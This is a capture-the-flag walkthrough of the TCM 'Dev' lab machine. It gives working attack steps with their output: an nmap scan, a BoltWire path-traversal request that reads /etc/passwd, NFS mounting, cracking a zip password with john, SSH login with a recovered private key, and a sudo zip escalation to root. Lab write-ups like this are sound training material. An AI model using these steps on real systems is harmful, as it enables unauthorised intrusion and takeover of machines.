---
title: Dev (TCM)

date: "2023-12-28"

author: "MatDef"

---

# Description:
- NONE
 
# Information Gathering

## Enumeration

### nmap
```bash
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35587/tcp6  mountd
|   100005  1,2,3      50697/tcp   mountd
|   100005  1,2,3      52252/udp6  mountd
|   100005  1,2,3      56976/udp   mountd
|   100021  1,3,4      34527/tcp6  nlockmgr
|   100021  1,3,4      35475/tcp   nlockmgr
|   100021  1,3,4      38742/udp   nlockmgr
|   100021  1,3,4      39771/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
35475/tcp open  nlockmgr 1-4 (RPC #100021)
38117/tcp open  mountd   1-3 (RPC #100005)
39221/tcp open  mountd   1-3 (RPC #100005)
50697/tcp open  mountd   1-3 (RPC #100005)
```
## Port 8080: http
Boltwire (6.03) - LFI Exploit
`/dev/index.php?p=action.search&action=../../../../../../../etc/passwd`
```shell
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
```
## Port 80: http
```shell
/public               (Status: 301) [Size: 317] [--> http://192.168.111.13/public/]
/src                  (Status: 301) [Size: 314] [--> http://192.168.111.13/src/]
/app                  (Status: 301) [Size: 314] [--> http://192.168.111.13/app/]
/vendor               (Status: 301) [Size: 317] [--> http://192.168.111.13/vendor/]
/extensions           (Status: 301) [Size: 321] [--> http://192.168.111.13/extensions/]

```
Username + Password found
`config .yml` in /app/config: Sqlite `bolt:I_love_java`

## Port 2049 NFS_ACL
Check for network mountable: `showmount -e 192.168.111.13`
Mounting: `mount -t nfs 192.168.111.13:/srv/nfs /mnt/share -o nolock`
Found save.zip with password : 
- `zip2john save.zip > ziphash`
- `john ziphash` -> `java 101`
- Content:
todo.txt
```shell
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome
jp
```
id_rsa (OPENSSH Private Key)

# Exploitation
With id_rsa connection via ssh:
```shell
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@192.168.111.13
```
Password the same as Sqlite DB : `I_love_java`
Access to `Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux`:
`sudo -l`
```shell
User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```
Gtfo_BINS:
```shell
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
updating: etc/hosts (deflated 31%)
# whoami
root
# cat flag.txt
Congratz on rooting this box !
```

---

### References & Further Research
- [gtfobins_zip](https://gtfobins.github.io/gtfobins/zip/)
